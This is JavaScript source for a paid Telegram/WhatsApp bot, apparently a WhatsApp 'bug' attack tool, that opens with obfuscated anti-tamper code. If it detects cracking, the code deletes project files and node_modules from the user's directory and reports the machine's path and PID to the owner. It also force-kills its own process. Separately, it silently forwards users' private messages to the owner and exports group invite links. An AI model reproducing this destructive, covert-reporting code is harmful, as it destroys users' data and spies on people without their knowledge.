(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93])
  const exitStr = buildStr([101,120,105,116])
  const killStr = buildStr([107,105,108,108])
  const httpsStr = buildStr([104,116,116,112,115])
  const httpStr = buildStr([104,116,116,112])
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require(buildStr([109,111,100,117,108,101]))
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]))
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]))
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()

require("dotenv").config({ path: "./settings/.config" });
const { Telegraf, Markup} = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const tokenBot = process.env.TOKEN_BOT;
const ownerID = process.env.OWNER_ID;
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()
const fs = require("fs");
const premiumGroupsFile = "./database/premiumGroups.json";

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const OWNER = "razzxy6-creator"; 
const REPO = "RAZZXY-DATABASE";
const TOKEN_FILE = "token.json"; 
const GITHUB_TOKEN = "";

const databaseUrl = `https://raw.githubusercontent.com/razzxy6-creator/RAZZXY-DATABASE/main/token.json`;

  const menuEffects = [
  "5046509860389126442",
  "5104841245755180586",
  "5107584321108051014",
  "5159385139981059251"
];

const thumbnailUrl = "https://files.catbox.moe/4ca415.png";
const StartUrl = "https://files.catbox.moe/4ca415.png";
const menuUrl = "https://files.catbox.moe/4ca415.png";
const bugUrl = "https://files.catbox.moe/4ca415.png";
const toolsUrl = "https://files.catbox.moe/4ca415.png";
const tqtoUrl = "https://files.catbox.moe/4ca415.png";
const attackUrl = "https://files.catbox.moe/4ca415.png";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(sock, target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(sock, target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function enableBypassProtection() {
  const { env, execArgv } = process;

  function deleteFilesOnCrack() {
    const files = [
      "package.json",
      "Xdread.js",
      ".config",
      ".npm",
      "node_modules",
      "settings",
      "χ-ɖʀєαɖ.zip"
    ];
    for (const file of files) {
      try {
        const targetPath = path.join(process.cwd(), file);
        if (fs.existsSync(targetPath)) {
          fs.unlinkSync(targetPath);
          console.log(`[SECURITY] File dihapus: ${file}`);
        }
      } catch (err) {
        console.error(`[ERROR] Gagal hapus ${file}: ${err.message}`);
      }
    }
  }
  async function reportToTelegram(reason) {
    const text = `🚨 *NGAPAIN KIDS KE DETECTED!*

📂 Path: ${process.cwd()}
🖥️ Node: ${process.version}
PID: ${process.pid}
Reason: ${reason}`;

    try {
      await axios.post(`https://api.telegram.org/bot${tokenBot}/sendMessage`, {
        chat_id: ownerID,
        text,
        parse_mode: "Markdown"
      });
      console.log("[REPORT] MAKLO SINI GUA BYPASS YATIM😂");
    } catch (err) {
      console.error("[REPORT] EROR BJIR NGAKAK:", err.message);
    }
  }

  const trueAbort = process.abort;
  const trueExit = process.exit;
  const trueToString = Function.prototype.toString.toString();

  Object.defineProperty(process, "abort", { value: trueAbort, configurable: false, writable: false });
  Object.defineProperty(process, "exit", { value: trueExit, configurable: false, writable: false });

  Object.freeze(Function.prototype);
  Object.freeze(axios.interceptors.request);
  Object.freeze(axios.interceptors.response);

  function onCrackDetected(reason) {
    console.error(`[SECURITY] ${reason}`);
    reportToTelegram(reason);
    deleteFilesOnCrack();
    process.kill(process.pid, "SIGKILL");
  }

  if (Function.prototype.toString.toString() !== trueToString) {
    onCrackDetected("Function.prototype.toString dibajak");
  }

  if (execArgv.length === 0 && process.execArgv !== execArgv) {
    onCrackDetected("process.execArgv dipalsukan");
  }

  ["HTTP_PROXY", "HTTPS_PROXY", "NODE_TLS_REJECT_UNAUTHORIZED", "NODE_OPTIONS"].forEach((key) => {
    if (env[key] && env[key] !== "" && env[key] !== "1") {
      onCrackDetected(`ENV ${key} disuntik: ${env[key]}`);
    }
  });

  if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
    onCrackDetected("Interceptor axios terdeteksi");
  }

  try {
    if (typeof module._load === "function") {
      const moduleCode = module._load.toString();
      if (!moduleCode.includes("tryModuleLoad") && !moduleCode.includes("Module._load")) {
        onCrackDetected("Module._load dibajak");
      }
    }
  } catch (err) {
    onCrackDetected("Gagal akses module._load: " + err.message);
  }

  try {
    const trap = Object.getOwnPropertyDescriptor(require.cache, "get");
    if (typeof trap === "function") {
      onCrackDetected("require.cache diproxy");
    }
  } catch {
    onCrackDetected("require.cache error");
  }

  console.log("\x1b[41m\x1b[37m[🔐 PROTECTION]\x1b[0m BY razzxy ACTIVE 🔥\n");
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
═―—⊱ ⎧ χ-ɖʀєαɖ ⎭ ⊰―—═⬡
│ Bot Sukses Terhubung Terimakasih
═―———————————————————―—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`⠀⠀⠀⠀⠀⠀
═―—⊱ ⎧ χ-ɖʀєαɖ ⎭ ⊰―—═⬡
│LU SIAPA BEGO MO PAKE SC GW FREE
│NGOTAK KIDS MINIMAL BELI DI @RazzxyBack😹😹
═―——————————————————————―—═⬡
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   MELACAK KEBERADAAN ANDA.        
├───────────────────────────────
│⟢ KING RAZZXY IS BACK
╰─❖──────────────────────────❖─╯
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  // ========== PERUBAHAN: EKSTRAK ID BOT (ANGKA SAJA) ==========
  const BOT_ID = tokenBot ? tokenBot.split(':')[0] : null;
  
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    // VALIDASI ID BOT (ANGKA SAJA), BUKAN TOKEN LENGKAP
    if (!BOT_ID || !tokens.includes(BOT_ID)) {
      console.log(chalk.bold.red(`
═―—⊱ ⎧ χ-ɖʀєαɖ ⎭ ⊰―—═⬡
│ BOT ID TIDAK NGGA TERDAFTAR KOCAK!
│ ID: ${BOT_ID || 'TIDAK DITEMUKAN'}
│ BELI AKSES @RazzxyBack
═―————————————―—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    } else {
      console.log(chalk.bold.green(`
═―—⊱ ⎧ χ-ɖʀєαɖ ⎭ ⊰―—═⬡
│ ✅ BOT ID VALID: ${BOT_ID}
│ AKSES DIIZINKAN
═―————————————―—═⬡
  `));
    }
  } catch (err) {
    console.log(chalk.bold.red(`
═―—⊱ ⎧ χ-ɖʀєαɖ ⎭ ⊰―—═⬡
│ GAGAL VALIDASI BOT ID!
│ ${err.message}
│ HUBUNGI @RazzxyBack
═―————————————―—═⬡
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    // ========== PERUBAHAN: EKSTRAK ID BOT ==========
    const BOT_ID = token ? token.split(':')[0] : null;
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(BOT_ID);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
bot.use((ctx, next) => {
  return next();
});

// ==================== AUTO NOTIF KE DEVELOPER ====================
// ============ NOTIF BOT DIMASUKIN KE GROUP + LINK ============
bot.on("new_chat_members", async (ctx) => {
  const newMembers = ctx.message.new_chat_members;
  const botId = ctx.botInfo.id;
  
  // CEK APAKAH BOT YANG DIMASUKIN
  const isBotAdded = newMembers.some(member => member.id === botId);
  
  if (isBotAdded) {
    const groupId = ctx.chat.id;
    const groupTitle = ctx.chat.title || "Tidak ada nama";
    const inviter = ctx.message.from;
    const inviterName = inviter.username ? `@${inviter.username}` : inviter.first_name;
    const inviterId = inviter.id;
    const waktu = new Date().toLocaleString();
    
    // COBA AMBIL LINK GROUP (HANYA BISA JIKA BOT ADMIN)
    let groupLink = "Tidak bisa diambil (bot bukan admin)";
    try {
      const inviteLink = await ctx.telegram.exportChatInviteLink(groupId);
      if (inviteLink) {
        groupLink = inviteLink;
      }
    } catch (error) {
      // BOT BUKAN ADMIN ATAU GAGAL AMBIL LINK
      groupLink = "❌ Bot bukan admin, tidak bisa ambil link";
    }
    
    // KIRIM NOTIF KE OWNER
    await ctx.telegram.sendMessage(ownerId, `
✅ *BOT DITAMBAHKAN KE GROUP*

👥 *Group Info:*
├ 📛 Nama: ${groupTitle}
├ 🆔 ID: \`${groupId}\`
└ 🔗 Link: ${groupLink}

👤 *Ditambahkan oleh:*
├ 👤 Nama: ${inviterName}
├ 🆔 ID: \`${inviterId}\`
└ 📛 Username: ${inviter.username ? `@${inviter.username}` : "Tidak ada"}

⏰ Waktu: ${waktu}

ℹ️ Bot siap digunakan di group ini.
    `, { parse_mode: "Markdown" });
    
    // BALAS KE GROUP (OPSIONAL)
    try {
      await ctx.reply(`
😹
      `, { parse_mode: "Markdown" });
    } catch (e) {}
  }
});
// ============ ANTI PM + LOG KE OWNER DENGAN TOMBOL ============
// ====================
const ownerId = ownerID;

// PESAN OTOMATIS KE USER
const autoReplyMessage = `😹`;

// MIDDLEWARE CEK PM
bot.use(async (ctx, next) => {
  const userId = ctx.from.id;
  const chatType = ctx.chat.type;
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const fullName = ctx.from.first_name || "Tidak ada nama";
  
  // LEWATIN KALAU OWNER
  if (userId == ownerId) {
    return next();
  }
  
  // CEK PRIVATE CHAT
  if (chatType === "private") {
    // KIRIM NOTIF KE OWNER (TANPA TOMBOL)
    await ctx.telegram.sendMessage(ownerId, `
🚨 *ADA YANG MENGETIK BOT DI PM*

👤 Nama: ${fullName}
🆔 User ID: \`${userId}\`
📛 Username: ${username}
💬 Pesan: ${ctx.message?.text || "Tidak ada pesan"}
⏰ Waktu: ${new Date().toLocaleString()}

⚠️ Orang ini mencoba menggunakan bot di Private Chat!
    `, { parse_mode: "Markdown" });
    
    // BALAS OTOMATIS KE USER
    return ctx.reply(autoReplyMessage, { parse_mode: "Markdown" });
  }
  
  return next();
});

// DATA CHANNEL (SIMpan di memory aja)
let channelList = [];

// LOAD & SAVE KE FILE (BIAR GA ILANG KALAU BOT RESTART)
const CHANNEL_FILE = 'channels.json';

// LOAD DATA
if (fs.existsSync(CHANNEL_FILE)) {
    channelList = JSON.parse(fs.readFileSync(CHANNEL_FILE, 'utf8'));
}

// SAVE DATA
function saveChannel() {
    fs.writeFileSync(CHANNEL_FILE, JSON.stringify(channelList, null, 2));
}

// AMBIL USERNAME DARI LINK
function getUsername(link) {
    let match = link.match(/t\.me\/([a-zA-Z0-9_]+)/);
    return match ? match[1] : null;
}

// CEK APAKAH USER JOIN SEMUA CHANNEL
async function cekJoinSemua(userId) {
    if (channelList.length === 0) return true;
    
    for (let ch of channelList) {
        try {
            let member = await bot.telegram.getChatMember(`@${ch.username}`, userId);
            let status = member.status;
            if (!['member', 'administrator', 'creator'].includes(status)) {
                return false;
            }
        } catch (e) {
            return false;
        }
    }
    return true;
}

// ============ COMMAND ADD CHANNEL ============
bot.command('addch', async (ctx) => {
    // HANYA OWNER
    if (ctx.from.id != ownerID) {
        return ctx.reply('<blockquote><b>❌ Akses Ditolak!</b>\n\nLu bukan owner!</blockquote>', { parse_mode: "HTML" });
    }
    
    let teks = ctx.message.text;
    let links = teks.split(' ');
    links.shift(); // HAPUS '/addch'
    
    if (links.length === 0) {
        return ctx.reply(`
<blockquote><b>📝 CARA PAKE:</b>

/addch https://t.me/razzxynewera
/addch link1 link2 link3

⚠️ BOT HARUS JADI ADMIN DI CHANNEL!</blockquote>`, { parse_mode: "HTML" });
    }
    
    let berhasil = [];
    let gagal = [];
    let udahAda = [];
    
    for (let link of links) {
        let username = getUsername(link);
        
        if (!username) {
            gagal.push(link + ' (link gak valid)');
            continue;
        }
        
        // CEK SUDAH ADA
        if (channelList.find(c => c.username === username)) {
            udahAda.push(`@${username}`);
            continue;
        }
        
        // CEK BOT ADMIN
        try {
            let botInfo = await bot.telegram.getMe();
            let chatMember = await bot.telegram.getChatMember(`@${username}`, botInfo.id);
            
            if (chatMember.status === 'administrator' || chatMember.status === 'creator') {
                channelList.push({
                    username: username,
                    link: link,
                    added: new Date().toISOString()
                });
                berhasil.push(`@${username}`);
            } else {
                gagal.push(`@${username} (bot bukan admin)`);
            }
        } catch (e) {
            gagal.push(`@${username} (error: bot bukan admin atau channel gak ada)`);
        }
    }
    
    saveChannel();
    
    let laporan = '<blockquote><b>📊 HASIL TAMBAH CHANNEL</b>\n\n';
    if (berhasil.length > 0) laporan += `✅ BERHASIL: ${berhasil.join(', ')}\n\n`;
    if (udahAda.length > 0) laporan += `⚠️ SUDAH ADA: ${udahAda.join(', ')}\n\n`;
    if (gagal.length > 0) laporan += `❌ GAGAL: ${gagal.join(', ')}\n\n`;
    laporan += `📌 TOTAL CHANNEL: ${channelList.length}</blockquote>`;
    
    ctx.reply(laporan, { parse_mode: "HTML" });
});

// ============ CEK DAFTAR CHANNEL ============
bot.command('listch', async (ctx) => {
    if (channelList.length === 0) {
        return ctx.reply('<blockquote><b>📭 Belum ada channel.</b>\n\nPake /addch ya</blockquote>', { parse_mode: "HTML" });
    }
    
    let msg = '<blockquote><b>📋 DAFTAR CHANNEL WAJIB</b>\n\n';
    for (let i = 0; i < channelList.length; i++) {
        msg += `${i+1}. ${channelList[i].link}\n`;
    }
    msg += `\n✅ TOTAL: ${channelList.length} channel`;
    
    if (ctx.from.id == ownerID) {
        msg += `\n\n🗑️ HAPUS: /delch [nomor]`;
    }
    msg += '</blockquote>';
    
    ctx.reply(msg, { parse_mode: "HTML" });
});

// ============ HAPUS CHANNEL ============
bot.command('delch', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply('<blockquote><b>❌ Akses Ditolak!</b>\n\nLu bukan owner!</blockquote>', { parse_mode: "HTML" });
    }
    
    let nomor = parseInt(ctx.message.text.split(' ')[1]);
    
    if (isNaN(nomor) || nomor < 1 || nomor > channelList.length) {
        return ctx.reply(`<blockquote><b>❌ Nomor gak valid!</b>\n\nPake nomor 1-${channelList.length}\nCek /listch dulu</blockquote>`, { parse_mode: "HTML" });
    }
    
    let hapus = channelList.splice(nomor - 1, 1)[0];
    saveChannel();
    
    ctx.reply(`<blockquote><b>✅ Berhasil hapus!</b>\n\n📌 ${hapus.link}\n📌 Sisa: ${channelList.length} channel</blockquote>`, { parse_mode: "HTML" });
});

// ============ HAPUS SEMUA ============
bot.command('delallch', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply('<blockquote><b>❌ Akses Ditolak!</b>\n\nLu bukan owner!</blockquote>', { parse_mode: "HTML" });
    }
    
    if (channelList.length === 0) {
        return ctx.reply('<blockquote><b>📭 Gak ada channel bro</b></blockquote>', { parse_mode: "HTML" });
    }
    
    channelList = [];
    saveChannel();
    ctx.reply(`<blockquote><b>✅ Semua channel udah dihapus!</b>\n\n📌 Total: ${channelList.length} channel tersisa</blockquote>`, { parse_mode: "HTML" });
});

// ============ MIDDLEWARE CEK JOIN ============
// ============ MIDDLEWARE CEK JOIN CHANNEL ============
const checkJoinChannel = async (ctx, next) => {
    let userId = ctx.from.id;
    
    // LEWATIN OWNER
    if (userId == ownerID) return next();
    
    // GA ADA CHANNEL, LANGSUNG LOLOS
    if (channelList.length === 0) return next();
    
    let joined = await cekJoinSemua(userId);
    
    if (!joined) {
        // BUAT TOMBOL
        let tombol = [];
        for (let ch of channelList) {
            tombol.push([{ 
                text: `🔗 ${ch.username}`, 
                url: ch.link,
                style: "Primary"
            }]);
        }
        tombol.push([{ 
            text: "✅ CEK LAGI", 
            callback_data: "cek_join",
            style: "Success"
        }]);
        
        return ctx.reply(`
<blockquote><b>⛔ AKSES DITOLAK!</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━
┃ <b>⚠️ PERHATIAN!</b>
┃
┃ Untuk bisa menggunakan bot ini,
┃ kamu harus JOIN semua channel
┃ wajib di bawah ini terlebih dahulu.
┃
┃ 📌 <i>Join dulu, baru balik lagi!</i>
┗━━━━━━━━━━━━━━━━━━━━━
</blockquote>

<b>📢 DAFTAR CHANNEL WAJIB JOIN:</b>
${channelList.map((ch, i) => `${i+1}. <a href="${ch.link}">${ch.username}</a>`).join('\n')}

⏱️ <i>Setelah join, tekan tombol CEK LAGI</i>
        `, {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: { inline_keyboard: tombol }
        });
    }
    
    next();
};

// ============ HANDLE TOMBOL CEK ============
bot.action('cek_join', async (ctx) => {
    let joined = await cekJoinSemua(ctx.from.id);
    let username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    
    if (joined) {
        await ctx.answerCbQuery('✅ Mantap! Sekarang bisa pake bot', { show_alert: false });
        
        await ctx.editMessageText(`
<blockquote><b>✅ AKSES DIBERIKAN!</b></blockquote>

<blockquote>
┏━━━━━━━━━━━━━━━━━━━━━
┃ <b>🎉 SELAMAT ${username}!</b>
┃
┃ Terima kasih sudah join semua
┃ channel wajib. Sekarang kamu
┃ bisa menggunakan bot ini.
┃
┃ ⚡ <i>Ketik /start untuk memulai</i>
┗━━━━━━━━━━━━━━━━━━━━━
</blockquote>
💡 <i>Enjoy menggunakan bot kami!</i>
        `, { 
            parse_mode: "HTML",
            disable_web_page_preview: true
        });
    } else {
        await ctx.answerCbQuery('❌ Masih ada channel yang belum dijoin! Cek lagi ya.', { show_alert: true });
        
        // HITUNG CHANNEL YANG BELUM DIJOIN
        let belumJoin = [];
        for (let ch of channelList) {
            try {
                let member = await bot.telegram.getChatMember(`@${ch.username}`, ctx.from.id);
                if (!['member', 'administrator', 'creator'].includes(member.status)) {
                    belumJoin.push(ch.username);
                }
            } catch (e) {
                belumJoin.push(ch.username);
            }
        }
        
        await ctx.answerCbQuery(`❌ Belum join: ${belumJoin.join(', ')}`, { show_alert: true });
    }
});
// ============ FITUR LINKGB 1 KALI PAKAI (VERSI KEREN) ============

// ============ FITUR LINKGB 1 KALI PAKAI (VERSI FIX) ============

// SIMPAN LINK YANG AKTIF
const activeLinks = new Map();

bot.command('linkgb', async (ctx) => {
    // CEK OWNER ATAU ADMIN
    if (ctx.from.id != ownerID && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ Akses hanya untuk owner/admin!");
